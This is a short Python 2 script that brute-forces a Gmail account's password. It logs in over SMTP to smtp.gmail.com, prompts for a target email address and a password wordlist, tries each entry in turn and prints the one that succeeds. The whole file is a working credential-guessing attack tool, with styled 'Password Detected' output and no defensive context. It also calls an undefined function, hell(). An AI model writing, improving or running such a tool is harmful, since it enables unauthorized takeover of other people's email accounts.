import smtplib
from os import system

mawar = "\033[31;1m"

smtpserver = smtplib.SMTP("smtp.gmail.com", 587)
smtpserver.ehlo()
smtpserver.starttls()

user = raw_input(mawar+"-->[!] Enter Email Target: ")
passwd = raw_input(mawar+"-->[!] Path and Name Wordlist: ")
passwd = open(passwd, "r")

for password in passwd:
    try:
                            smtpserver.login(user, password)
                            system("clear")
                            hell()
                            print mawar+"\n"
                            print mawar+"-->[!] Password Detected :" + password
                            break
    except smtplib.SMTPAuthenticationError as e:
                error = str(e)
                if error[14] == '<':
                            system('clear')
                            hell()
                            print "\n"
                            print mawar+"-->[!] Password Zonk!:" + password
                            break
                else:
                        print mawar+"-->[!] Password Zonk!:" + password


